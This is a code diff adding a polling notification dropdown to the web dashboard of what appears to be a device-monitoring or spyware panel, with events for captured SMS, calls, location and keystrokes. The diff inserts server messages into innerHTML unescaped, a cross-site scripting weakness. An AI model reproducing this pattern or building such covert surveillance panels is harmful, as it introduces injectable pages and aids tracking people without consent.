@@ -50,94 +50,107 @@
         data-bs-toggle="dropdown"
         data-bs-display="static"
         class="menu-link"
+        id="notifToggle"
       >
         <div class="menu-icon"><i class="bi bi-bell nav-icon"></i></div>
-        <div class="menu-badge bg-theme"></div>
+        <div class="menu-badge bg-theme" id="notifBadge" style="display:none"></div>
       </a>
       <div class="dropdown-menu dropdown-menu-end mt-1 w-300px fs-11px pt-1">
-        <h6 class="dropdown-header fs-10px mb-1">NOTIFICATIONS</h6>
-        <div class="dropdown-divider mt-1"></div>
-        <a
-          href="#"
-          class="d-flex align-items-center py-10px dropdown-item text-wrap"
-        >
-          <div class="fs-20px">
-            <i class="bi bi-bag text-theme"></i>
-          </div>
-          <div class="flex-1 flex-wrap ps-3">
-            <div class="mb-1 text-white">NEW ORDER RECEIVED ($1,299)</div>
-            <div class="small">JUST NOW</div>
-          </div>
-          <div class="ps-2 fs-16px">
-            <i class="bi bi-chevron-right"></i>
-          </div>
-        </a>
-        <a
-          href="#"
-          class="d-flex align-items-center py-10px dropdown-item text-wrap"
-        >
-          <div class="fs-20px w-20px">
-            <i class="bi bi-person-circle text-theme"></i>
-          </div>
-          <div class="flex-1 flex-wrap ps-3">
-            <div class="mb-1 text-white">3 NEW ACCOUNT CREATED</div>
-            <div class="small">2 MINUTES AGO</div>
-          </div>
-          <div class="ps-2 fs-16px">
-            <i class="bi bi-chevron-right"></i>
-          </div>
-        </a>
-        <a
-          href="#"
-          class="d-flex align-items-center py-10px dropdown-item text-wrap"
-        >
-          <div class="fs-20px w-20px">
-            <i class="bi bi-gear text-theme"></i>
-          </div>
-          <div class="flex-1 flex-wrap ps-3">
-            <div class="mb-1 text-white">SETUP COMPLETED</div>
-            <div class="small">3 MINUTES AGO</div>
-          </div>
-          <div class="ps-2 fs-16px">
-            <i class="bi bi-chevron-right"></i>
-          </div>
-        </a>
-        <a
-          href="#"
-          class="d-flex align-items-center py-10px dropdown-item text-wrap"
-        >
-          <div class="fs-20px w-20px">
-            <i class="bi bi-grid text-theme"></i>
-          </div>
-          <div class="flex-1 flex-wrap ps-3">
-            <div class="mb-1 text-white">WIDGET INSTALLATION DONE</div>
-            <div class="small">5 MINUTES AGO</div>
-          </div>
-          <div class="ps-2 fs-16px">
-            <i class="bi bi-chevron-right"></i>
-          </div>
-        </a>
-        <a
-          href="#"
-          class="d-flex align-items-center py-10px dropdown-item text-wrap"
-        >
-          <div class="fs-20px w-20px">
-            <i class="bi bi-credit-card text-theme"></i>
-          </div>
-          <div class="flex-1 flex-wrap ps-3">
-            <div class="mb-1 text-white">PAYMENT METHOD ENABLED</div>
-            <div class="small">10 MINUTES AGO</div>
-          </div>
-          <div class="ps-2 fs-16px">
-            <i class="bi bi-chevron-right"></i>
-          </div>
-        </a>
-        <hr class="bg-white-transparent-5 mb-0 mt-2" />
+        <div class="d-flex align-items-center justify-content-between px-3 mb-1">
+          <h6 class="dropdown-header fs-10px mb-0 ps-0">NOTIFICATIONS</h6>
+          <button id="markAllReadBtn" class="btn btn-link btn-sm fs-10px text-muted p-0" style="text-decoration:none">MARK ALL READ</button>
+        </div>
+        <div class="dropdown-divider mt-1 mb-0"></div>
+        <div id="notifList" style="max-height:320px;overflow-y:auto">
+          <div class="text-center text-muted py-3 fs-12px" id="notifEmpty">No notifications</div>
+        </div>
+        <hr class="bg-white-transparent-5 mb-0 mt-0" />
         <div class="py-10px mb-n2 text-center">
-          <a href="#" class="text-decoration-none fw-bold">SEE ALL</a>
+          <span class="text-muted fs-10px" id="notifUnreadSummary"></span>
         </div>
       </div>
     </div>
+
+    <script>
+    (function () {
+      const EVENT_ICONS = {
+        new_sms: 'bi-chat-dots',
+        new_call: 'bi-telephone',
+        new_location: 'bi-geo-alt',
+        new_keystrokes: 'bi-keyboard',
+        device_online: 'bi-phone',
+        device_offline: 'bi-phone-fill',
+      };
+
+      function timeAgo(iso) {
+        const diff = Math.floor((Date.now() - new Date(iso)) / 1000);
+        if (diff < 60) return 'Just now';
+        if (diff < 3600) return `${Math.floor(diff / 60)}m ago`;
+        if (diff < 86400) return `${Math.floor(diff / 3600)}h ago`;
+        return `${Math.floor(diff / 86400)}d ago`;
+      }
+
+      function renderNotifs(data) {
+        const list = document.getElementById('notifList');
+        const badge = document.getElementById('notifBadge');
+        const summary = document.getElementById('notifUnreadSummary');
+
+        if (!data.notifications || data.notifications.length === 0) {
+          list.innerHTML = '<div class="text-center text-muted py-3 fs-12px" id="notifEmpty">No notifications</div>';
+          badge.style.display = 'none';
+          summary.textContent = '';
+          return;
+        }
+
+        badge.style.display = data.unread_count > 0 ? '' : 'none';
+        summary.textContent = data.unread_count > 0 ? `${data.unread_count} unread` : '';
+
+        list.innerHTML = data.notifications.map(n => {
+          const icon = EVENT_ICONS[n.event_type] || 'bi-bell';
+          const unreadStyle = n.is_read ? '' : 'background:rgba(255,255,255,0.04)';
+          return `<a href="#" class="d-flex align-items-center py-10px dropdown-item text-wrap notif-item" data-id="${n.id}" style="${unreadStyle}">
+            <div class="fs-20px w-20px"><i class="bi ${icon} text-theme"></i></div>
+            <div class="flex-1 flex-wrap ps-3">
+              <div class="mb-1 text-white" style="font-size:11px;line-height:1.4">${n.message}</div>
+              <div class="small text-muted">${timeAgo(n.created_at)}</div>
+            </div>
+          </a>`;
+        }).join('');
+
+        list.querySelectorAll('.notif-item').forEach(el => {
+          el.addEventListener('click', function (e) {
+            e.preventDefault();
+            const id = this.dataset.id;
+            this.style.background = '';
+            fetch(`/api/notifications/${id}/read`, { method: 'POST', headers: { 'X-CSRFToken': document.querySelector('meta[name="csrf-token"]')?.content || '' } });
+          });
+        });
+      }
+
+      function fetchNotifs() {
+        fetch('/api/notifications')
+          .then(r => r.json())
+          .then(data => { if (data.success) renderNotifs(data); })
+          .catch(() => {});
+      }
+
+      document.getElementById('markAllReadBtn')?.addEventListener('click', function (e) {
+        e.preventDefault();
+        e.stopPropagation();
+        fetch('/api/notifications/read-all', { method: 'POST', headers: { 'X-CSRFToken': document.querySelector('meta[name="csrf-token"]')?.content || '' } })
+          .then(() => fetchNotifs());
+      });
+
+      // Load on dropdown open
+      document.getElementById('notifToggle')?.addEventListener('click', fetchNotifs);
+
+      // Poll every 30s
+      setInterval(fetchNotifs, 30000);
+
+      // Initial load
+      fetchNotifs();
+    })();
+    </script>
     <div class="menu-item dropdown dropdown-mobile-full">
       <a
         href="#"
